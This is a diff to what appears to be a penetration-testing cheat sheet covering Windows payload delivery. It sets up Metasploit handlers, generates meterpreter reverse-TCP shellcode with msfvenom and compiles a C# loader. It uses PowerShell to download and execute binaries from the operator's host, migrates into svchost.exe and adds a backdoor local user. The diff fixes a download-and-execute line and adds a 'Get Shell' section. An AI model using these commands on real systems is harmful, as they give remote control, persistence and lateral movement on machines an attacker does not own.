@@ -1260,7 +1260,7 @@ msfconsole -q -x 'use exploit/multi/handler; setg SRVPORT 8888; setg LHOST $MYIP
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$MYIP LPORT=443 -f csharp
 nano /Upload/windows/connect.cs   # edit IP/PORT/SHELLCODE
 mcs /Upload/windows/connect.cs
-powershell -c $MYIP/windows/Reflect.exe -o \windows\tasks\Reflect.exe; \windows\tasks\Reflect.exe http://$MYIP/windows/connect.exe
+powershell -c curl $MYIP/windows/Reflect.exe -o \windows\tasks\Reflect.exe; \windows\tasks\Reflect.exe http://$MYIP/windows/connect.exe
 migrate -N svchost.exe
 
 [###] Web Delivery (PowerShell)
@@ -1483,6 +1483,10 @@ powershell -c "Invoke-Command -ScriptBlock { net user dbf 123qweasdF! /add; net 
 
 ## Verify Access
 sprayme 'dbf:123qweasdF!' hosts
+
+## Get Shell
+powershell -c curl $MYIP/windows/Reflect.exe -o \windows\tasks\Reflect.exe; \windows\tasks\Reflect.exe http://$MYIP/windows/connect.exe
+migrate -N svchost.exe
 
 # Lateral Movement: Pivoting
 ## Identify
